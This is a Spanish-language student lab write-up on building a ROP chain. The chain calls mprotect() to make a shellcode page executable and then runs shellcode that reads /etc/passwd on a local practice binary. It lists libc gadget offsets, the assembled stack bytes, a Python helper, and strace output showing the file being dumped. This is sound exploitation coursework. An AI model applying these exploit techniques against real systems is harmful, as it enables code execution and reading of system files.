------ Práctica 3 ROP ------
Autor -> Ismael Gómez Esquilichi
----------------------------

La idea de esta práctica es crear una cadena ROP para ejecutar la llamada a sistema mprotect()
para cambiar los permisos de ejecución de la página de memoria que contiene el shellcode con el
que vamos a leer el contenido del fichero "/etc/passwd"

¡IMPORTANTE! Tuve que instalarme la ISO en Proxmox debido a que uso una máquina con
arquitectura ARM64, por lo que no he podido utilizar la OVA proporcionada. Debido a esto tengo una
dirección base de la libc distinta a la normal -> "0x00007ffff7def000"

----------------------------
	    Requisitos
----------------------------
Para poder ejecutar la llamada a sistema necesitamos tener ciertos registros con un valor exacto.

%rax -> 10 Define el número de la llamada a sistema mprotect()

%rdi -> Dirección de la página de la que queremos cambiar los permisos y darle ejecución
    	    La dirección que debemos guardar aquí es donde se almacenará nuestro shellcode que
	        ejecutará las instrucciones necesarias para imprimir por stdout el fichero "/etc/passwd"
	        ¡Importante! Esta dirección debe estar alineada a marco de memoria

%rsi -> Longitud de bytes a los que queremos cambiarle los permisos, definido en el dichero dado
		    en el enunciado de la práctica (8192 bytes)

%rdx -> En este argumento necesitamos escribir a que permisos queremos cambiar la pagina de memoria,
			en este caso vamos a dejar la página con permisos de RWX (R = 4, W = 2, X = 1) por lo que
			en hexadecimal vamos a dejarlo en 0x7 (la suma de los 3 permisos)

----------------------------
Aplicar mprotect() a la dirección correcta
----------------------------
He modificado el código para que me imprima la dirección de memoria donde se encuentra el array "shellcode"

Modificación:
	printf("Shellcode address -> %p\n" ,&shellcode);
	El verb "%p" nos permite imprimir la dirección de memoria a la que apunta un puntero
	Output: Shellcode address -> 0x555555558040
De forma adicional, con radare2 se puede sacar esta información con el comando "is"

	60  0x00003040 0x555555558040 GLOBAL OBJ    8192     shellcode

Una vez que conocemos donde se encuentra el array shellcode vamos a ejecutarlo con radare2 para ver
a que página de memoria se corresponde y asignarle los permisos correspondientes a esa página de memoria.
Recordemos que no podemos pasarle la dirección "0x555555558040" ya que no está alineada a marco de memoria.

----------------------------
Descubrir el marco de página correcto
----------------------------

Vamos a lanzar el binario con radare2 para inspeccionar el mapa de memoria del proceso en ejecución

Para ejecutar el programa bastaría con ejecutar el comando "r2 -d a.out"
Una vez estamos en el menú interactivo de radare, ejecutamos los siguientes comandos

	aaa     - Analizar el código del binario
	afl     - Lista todas las funciones del binario
	db main - Crea un breakpoint en main
	dc      - Avanzamos la ejecución del programa hasta toparnos con el breakpoint
	dm      - Imprime el mapa de memoria del proceso que se está analizando

Con el último comando, obtenemos un output que nos muestra todos los mapas de memoria del proceso, entre
ellos nos encontramos con el siguiente

0x0000555555558000 - 0x000055555555b000 - usr    12K s rw- <path> <path> ; obj._GLOBAL_OFFSET_TABLE_

Como podemos ver, la dirección de memoria donde se encuentra el shellcode cae en este marco de página
por lo que a mprotect() le vamos a pasar como argumento la dirección "0x0000555555558000"


----------------------------
	      GADGETS
----------------------------
1. radare2 para encontrar gadgets

Para encontrar gadgets he probado ROPgadget, pero me he quedado con radare2 ya que era más fácil de hacer
grep en el txt de resultados y la sintáxis la podemos poner en AT&T, en vez de Intel que es la única que
soporta ROPgadget.

Para sacar los gadgets con radare2 he seguido los pasos dados en el enunciado de la práctica

2. %rdi

Como hemos comentado antes, necesitamos la dirección "0x0000555555558000" en el registro %rdi, por lo que
para buscar gadgets lanzo el siguiente comando -> "cat gadgets.txt | grep 'popq %rdi' -B2 -A2"

Como resultado encuentro este posible gadget

	0x0016d275                 5f  popq %rdi
	0x0016d276                 c3  retq

3. %rsi

En el caso de este registro, necesitamos almacenar un 0x2000 (8192) que va a servir para decirle a
mprotect() que tiene que cambiarle los permisos a 8192 bytes (marco de página)

	0x00135839                 5e  popq %rsi
	0x0013583a                 c3  retq


4. %rdx

En %rdx nos interesa almacenar un 0x7, que son los permisos de r+w+x para el marco de página.

	0x000ff76d                 5a  popq %rdx
	0x000ff76e                 c3  retq

5. %rax

En %rax queremos un 0xa (un 10 en hex) para que referenciemos al número de syscall de mprotect()


	0x000ffca4                 58  popq %rax
	0x000ffca5                 c3  retq

6. syscall

Necesitamos saltar a una dirección de la libc que ejecuta la syscall que hemos preparado anteriormente
con la cadena ROP

	0x000fe6d5               0f05  syscall
  0x000fe6d7                 c3  retq


7. Ir al shellcode

Finalmente, necesitamos tener la dirección donde se encuentra el shellcode al que le acabamos
de aplicar el mprotect() para poder ejecutarlo.

	0x0000555555558040       dirección shellcode que muestra por stdout "/etc/passwd"


----------------------------
     Calcular Offsets
----------------------------

Ya tenemos planteada la cadena ROP, pero las direcciones que nos sale detrás de cada instrucción
están en el contexto de la propia librería, por lo que debemos mirar cuál es la direccion de memoria
en la que está en la "libc"

Para calcular la base de la librería lo podemos sacar mirando el mapa de procesos con radare2 y el
comando "dmi".

	¡Mi dirección base de la libc es distinta!
	0x7ffff7def000 0x7ffff7e14000  /usr/lib/x86_64-linux-gnu/libc-2.31.so

Observamos que el fichero de la libc no es el mismo que se comenta en el enunciado, pero si miramos
que es el fichero "libc.so.6" es un enlace simbólico a el que nos devuelve radare2.

Para la suma de hexadecimales he utilizado la consola de Python

	print(hex(<dir base libc> + <dir gadget>))

Offset para %rdi ->    0x00007ffff7f5c275
Valor para  %rdi ->    0x0000555555558000

Offset para %rsi ->    0x00007ffff7f24839
Valor para  %rsi ->    0x0000000000002000

Offset para %rdx ->    0x00007ffff7eee76d
Valor para  %rdx ->    0x0000000000000007

Offset para %rax ->    0x00007ffff7eeeca4
Valor para  %rax ->    0x000000000000000a

Offset para syscall -> 0x00007ffff7eed6d5

Dirección shellcode -> 0x0000555555558040


La cadena ROP quedaría finalizada ejecutando el shellcode.


----------------------------
   Obtener stack en hex
----------------------------

Para incrustar la cadena ROP, tenemos que pasar todas las direcciones a formato little endian,
para esta tarea he utilizado la herramienta online "https://gchq.github.io/CyberChef/" que contiene
muchas utilidades.

Finalmente, me he copiado todas las direcciones concatenadas a un fichero y para sacar el contenido del
array "newstack" he utilizado el siguiente script en Python.

file = open("cadena","r")

while 1:

	char = file.read(2)
	if not char:
		break

	print("0x" + str(char) + ", ", end="")

Como output obtenemos lo siguiente:
0x75, 0xc2, 0xf5, 0xf7, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00, 0x39,
0x48, 0xf2, 0xf7, 0xff, 0x7f, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6d, 0xe7,
0xee, 0xf7, 0xff, 0x7f, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa4, 0xec, 0xee,
0xf7, 0xff, 0x7f, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd5, 0xd6, 0xee, 0xf7,
0xff, 0x7f, 0x00, 0x00, 0x40, 0x80, 0x55, 0x55, 0x55, 0x55, 0x00, 0x00

Finalmente, incrustamos este contenido en el array newstack de code.c, compilamos y ejecutamos.

----------------------------
	      Strace
----------------------------
Adicionalmente, como mi binario no va a funcionar en la máquina virtual de prueba, dejo aquí el output de
la utilidad strace, que permite registrar las syscalls usadas por un determinado programa.

Output:
execve("./rop", ["./rop"], 0x7fffffffde90 /* 44 vars */) = 0
brk(NULL)                               = 0x55555555d000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No existe el fichero o el directorio)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=87301, ...}) = 0
mmap(NULL, 87301, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7ffff7fb6000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0@n\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1839792, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fb4000
mmap(NULL, 1852680, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7ffff7def000
mprotect(0x7ffff7e14000, 1662976, PROT_NONE) = 0
mmap(0x7ffff7e14000, 1355776, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x25000) = 0x7ffff7e14000
mmap(0x7ffff7f5f000, 303104, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x170000) = 0x7ffff7f5f000
mmap(0x7ffff7faa000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1ba000) = 0x7ffff7faa000
mmap(0x7ffff7fb0000, 13576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7ffff7fb0000
close(3)                                = 0
arch_prctl(ARCH_SET_FS, 0x7ffff7fb5540) = 0
mprotect(0x7ffff7faa000, 12288, PROT_READ) = 0
mprotect(0x555555557000, 4096, PROT_READ) = 0
mprotect(0x7ffff7ffc000, 4096, PROT_READ) = 0
munmap(0x7ffff7fb6000, 87301)           = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(0x88, 0x2), ...}) = 0
brk(NULL)                               = 0x55555555d000
brk(0x55555557e000)                     = 0x55555557e000
write(1, "Shellcode address -> 0x555555558"..., 36Shellcode address -> 0x555555558040
) = 36
mprotect(0x555555558000, 8192, PROT_READ|PROT_WRITE|PROT_EXEC) = 0 !El mprotect del ROP!
open("/////etc/passwd", O_RDONLY)       = 3
read(3, "root:x:0:0:root:/root:/bin/bash\n"..., 256) = 256
write(1, "root:x:0:0:root:/root:/bin/bash\n"..., 256root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var) = 256
read(3, "/cache/man:/usr/sbin/nologin\nlp:"..., 256) = 256
write(1, "/cache/man:/usr/sbin/nologin\nlp:"..., 256/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/n) = 256
read(3, "ologin\nwww-data:x:33:33:www-data"..., 256) = 256
write(1, "ologin\nwww-data:x:33:33:www-data"..., 256ologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting Sy) = 256
read(3, "stem (admin):/var/lib/gnats:/usr"..., 256) = 256
write(1, "stem (admin):/var/lib/gnats:/usr"..., 256stem (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-netw) = 256
read(3, "ork:x:102:103:systemd Network Ma"..., 256) = 256
write(1, "ork:x:102:103:systemd Network Ma"..., 256ork:x:102:103:systemd Network Management <recortado>
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
tss:x:104:110:TPM software stack,,,:/var/lib/tpm:/bin/false
messagebus:x:105:111::/nonexistent:/usr/sbin) = 256
read(3, "/nologin\nusbmux:x:106:46:usbmux "..., 256) = 256
write(1, "/nologin\nusbmux:x:106:46:usbmux "..., 256/nologin
usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:107:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
avahi:x:110:115:) = 256
read(3, "Avahi mDNS daemon,,,:/run/avahi-"..., 256) = 256
write(1, "Avahi mDNS daemon,,,:/run/avahi-"..., 256Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
pulse:x:112:116:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
saned:x:113:119::/var/lib/saned:/usr/sbin/nologin
c) = 256
read(3, "olord:x:114:120:colord colour ma"..., 256) = 256
write(1, "olord:x:114:120:colord colour ma"..., 256olord:x:114:120:colord colour management daemon <recortado>
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
Debian-gdm:x:116:122:Gnome Display Manager:/var/lib/gdm3:/bin/false
malware:x:1000:1000:malware,,,:/home/malware:/bin) = 256
read(3, "/bash\nsystemd-coredump:x:999:999"..., 256) = 73
write(1, "/bash\nsystemd-coredump:x:999:999"..., 73/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
) = 73
read(3, "", 256)                        = 0
close(3)                                = 0
exit(0)                                 = ?
+++ exited with 0 +++

Se puede observar que se realiza el mprotect() con los argumentos correctos antes de empezar a leer el fichero
"/etc/passwd", es decir, la rutina del shellcode.